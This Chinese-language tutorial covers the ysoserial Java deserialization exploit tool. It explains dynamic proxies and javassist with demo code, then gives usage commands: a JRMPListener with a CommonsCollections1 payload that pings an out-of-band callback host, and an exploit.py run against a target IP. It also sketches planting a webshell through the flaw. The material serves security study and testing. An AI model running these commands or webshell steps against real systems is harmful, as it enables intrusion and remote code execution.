---
description: 这个工具你要说是听都没听过，你可就out了
---

# Ysoserial

        ysoserial这个工具真是写的出奇的好，它是基于上一篇反序列化漏洞挖掘思路来生成序列化payload数据的工具。

        其中针对Apache Commons Collections 3的payload也是基于`TransformedMap`和`InvokerTransformer`来构造的，然而在触发时，并没有采用上文介绍的`AnnotationInvocationHandler`，而是使用了`java.lang.reflect.Proxy`中的相关代码来实现触发。此处不再做深入分析，有兴趣的读者可以参考下面的链接获取及编译ysoserial的源码。

* 相关Tool链接
  * [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
  * [https://github.com/CaledoniaProject/jenkins-cli-exploit](https://github.com/CaledoniaProject/jenkins-cli-exploit)
  * [https://github.com/foxglovesec/JavaUnserializeExploits](https://github.com/foxglovesec/JavaUnserializeExploits)

## 关键技术

### 动态代理

动态代理比较常见的用处就是：**在不修改类的源码的情况下,通过代理的方式为类的方法提供更多的功能。**

举个例子来说（这个例子在开发中很常见）：我的开发们实现了业务部分的所有代码，忽然我期望在这些业务代码中多添加日志记录功能的时候，一个一个类去添加代码就会非常麻烦，这个时候我们就能通过动态代理的方式对期待添加日志的类进行代理。

看一个简单的demo：

Work接口需要实现work函数

```java
public interface Work {
    public String work();
}
```

Teacher类实现了Work接口

```java
public class Teacher implements Work{
    @Override
    public String work() {
        System.out.println("my work is teach students");
        return "Teacher";
    }
}
```

WorkHandler用来处理被代理对象，它必须继承InvocationHandler接口，并实现invoke方法

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
public class WorkHandler implements InvocationHandler{
    //代理类中的真实对象
    private Object obj;
    //构造函数，给我们的真实对象赋值
    public WorkHandler(Object obj) {
        this.obj = obj;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        //在真实的对象执行之前我们可以添加自己的操作
        System.out.println("before invoke。。。");
        //java的反射功能，用来调用obj对象的method方法，传入参数为args
        Object invoke = method.invoke(obj, args);
        //在真实的对象执行之后我们可以添加自己的操作
        System.out.println("after invoke。。。");
        return invoke;
    }
}
```

在Test类中通过Proxy.newProxyInstance进行动态代理，这样当我们调用代理对象proxy对象的work方法的时候，**实际上调用的是WorkHandler的invoke方法**。

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
public class Test {
    public static void main(String[] args) {
        //要代理的真实对象
        Work people = new Teacher();
        //代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法
        InvocationHandler handler = new WorkHandler(people);
        /**
         * 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数
         * 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象
         * 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法
         * 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上
         */
        Work proxy = (Work)Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);
        System.out.println(proxy.work());
    }
}
```

看一下输出结果，我们再没有改变Teacher类的前提下通过代理Work接口，实现了work函数调用的重写。

```java
before invoke。。。
my work is teach students
after invoke。。。
Teacher
```

### javassist动态编程

ysoserial中基本上所有的恶意object都是通过动态编程的方式生成的，通过这种方式我们可以直接对已经存在的java文件字节码进行操作，也可以在内存中动态生成Java代码，动态编译执行，关于这样做的好处，作者在工具中也有提到：

{% hint style="success" %}
could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
{% endhint %}

关于javassist动态编程，我就只把关键的函数及其功能罗列一下了

```java
//获取默认类池，只有在这个ClassPool里面已经加载的类，才能使用
ClassPool pool = ClassPool.getDefault();
//获取pool中的某个类
CtClass cc = pool.get("test.Teacher");
//为cc类设置父类
cc.setSuperclass(pool.get("test.People"));
//将动态生成类的class文件存储到path路径下
cc.writeFile(path);
//获取类的字节码
byte[] b=cc.toBytecode();
//创造Point类
CtClass cc = pool.makeClass("Point");
//为cc类添加成员变量
cc.addField(f);
//为cc类添加方法
cc.addMethod(m);
//为cc类设置类名
cc.setName("Pair");
```

## 使用方式

### 0x01 基本使用方法

**在公网vps上执行:**

```text
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [port] CommonsCollections1 '[commands]'
```

port:公网vps上监听的端口号  
commands:需要执行的命令  
例子：

```java
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'ping -c 2 rce.267hqw.ceye.io'
```

**重启一个shell窗口：**

```text
python exploit.py 【目标ip】 【目标端口】 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 【JRMPListener ip】  【JRMPListener port】 JRMPClient
```

列子：

```text
python exploit.py 118.89.53.139  7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 118.89.53.139  1099 JRMPClient
```

### 0x02 在ysoserial编写自己的payload

发现的新的调用链之后，编写的新的payload作为补充。

### 0x03 在burp中集成插件使用

有关在burp中的使用，请参考我的博客：[使用Burp插件Java-Deserialization-Scanner检测java反序列化漏洞](https://bleke.top/articles/2020/05/14/1589443660291.html)

## 总结

### 漏洞分析

* 引发：如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。 
* 原因：类ObjectInputStream在反序列化时，没有对生成的对象的输入做限制，使攻击者利用反射调用函数进行任意命令执行。
  * CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法 
* 根源：Apache Commons Collections允许链式的任意的类函数反射调用 
  * 问题函数：org.apache.commons.collections.Transformer接口
* 利用：要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化代码。
* 思路：攻击者通过允许Java序列化协议的端口，把序列化的攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行。 

### 漏洞利用        

至于如何使用这个漏洞对系统发起攻击，举一个简单的思路，通过本地java程序将一个带有后门漏洞的jsp（一般来说这个jsp里的代码会是文件上传和网页版的SHELL）序列化， 将序列化后的二进制流发送给有这个漏洞的服务器，服务器会反序列化该数据的并生成一个webshell文件，然后就可以直接访问这个生成的webshell文件进行进一步利用。

## 参考文献

* Java反序列化漏洞分析：[https://www.cnblogs.com/ssooking/p/5875215.html](https://www.cnblogs.com/ssooking/p/5875215.html)
* 反序列化工具ysoserial使用介绍：[http://www.mamicode.com/info-detail-2407213.html](http://www.mamicode.com/info-detail-2407213.html)
* 玩转Ysoserial-CommonsCollection的七种利用方式分析：[https://www.freebuf.com/articles/web/214096.html](https://www.freebuf.com/articles/web/214096.html)



